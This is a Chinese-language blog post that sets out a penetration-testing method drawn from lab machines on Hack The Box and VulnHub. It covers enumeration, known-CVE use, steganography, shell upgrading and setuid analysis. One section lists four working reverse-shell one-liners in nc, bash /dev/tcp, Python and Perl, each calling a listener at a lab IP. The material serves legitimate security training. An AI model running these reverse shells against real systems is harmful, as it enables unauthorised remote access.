---
title: 渗透测试通用方法论
date: 2025-12-27T17:29:33+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 技术
---
> 本文章以笔者写过的 80 台靶机为样本做渗透测试方法论分析

> 本文章持续更新中
## 靶机分类

### 攻击链复杂度分层

#### Easy 类型

这类靶机没有复杂的攻击链，一般进行 信息收集、单漏洞利用 就可以拿到一个初始的立足点，然后进行简单的提权操作即可获得 root 权限。

##### Web 漏洞链路

```
信息收集 → 目录爆破 → Web漏洞（SQL注入/命令注入/文件上传 等）→ 获得初始立足点 → 本地提权（SUID/Sudo/Cron/内核漏洞 等）
```

例如：
- Hack The Box 靶机 Busqueda 访问 80 端口暴露出使用的为开源系统 Searchor 2.4.0，随后在网络上搜索相关的漏洞利用

![漏洞搜索示意图](漏洞搜索示意图.png)

![AI驱动搜索](AI驱动搜索.png)

在 kali 本地监听获得初始立足点后进行手工枚举（sudo -l ; whoami ;ip a 等），随后根据具体的情况进行进一步提权

##### 凭证泄露

```
服务枚举（SMB/FTP/NFS）→ 匿名访问/弱密码 → 凭证发现 → SSH/WinRM登录 → 提权
```

例如：
- VulnHub 的靶机 LazySysAdmin 开启了 smb 服务，通过连接共享文件夹获取 mysql  和 phpmyadmin 的账号密码，通过暴力破解密码，ssh 获得初始立足点，随后提权。

##### 已知 CVE 利用

```
版本识别 → CVE查询 → POC利用 → 过的初始立足点 → 基础
```

例如：
- Hack The Box 的靶机  Broker，通过利用 ActiveMQ 的 CVE payload 获得初始立足点

#### Medium 类型

这类靶机相对 Easy 类型靶机攻击难度略微复杂 。

#### Hard 类型

这类靶机通常需要多个攻击链利用，渗透难度较大。
## 遇见的情况以及方法论

### 开放的非常规端口

遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。

```
┌──(kali㉿kali)-[~/Work/Kali]
└─$ nc -u 10.10.10.45 1440
?

Wrong Code!!
We'll notify Commander Tarkin of this offense
```

使用 echo 传输字符串并通过 nc 链接端口。

```
┌──(kali㉿kali)-[~/Work/Kali]
└─$ echo "DS-1@OBS" | nc -u 10.10.10.45 1440
......
```

### 图片分析

图片分析一般先查看隐写情况。

```
┌──(kali㉿kali)-[~/Work/Kali]
└─$ steghide extract -sf x.jpg
Enter passphrase:
```

解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 --stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。

### Bash 逃逸

在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。

```
python3 -c "import pty;pty.spawn('/bin/bash');"
```

### 获得 shell 的一些 反弹 shell

#### Linux

```
nc -e /bin/bash 10.10.10.5 4444

bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 文件属性和可识别字符

在拿到一个文件后可进行如下分析：

![P1](P1.png)

file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 `not stripped` 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。

```
┌──(kali㉿kali)-[~/Work/Kali]
└─$ strings /bin/dartVader
```

### 将文件从 ssh 中拿出

以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。

```
┌──(kali㉿kali)-[~/Work/Kali]
└─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .
```

### 使用 curl 将返回的内容输出为中文

```
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl -s http://10.10.10.45/secret | trans -b :zh
```

trans（translate-shell）是很不错的命令行翻译工具。
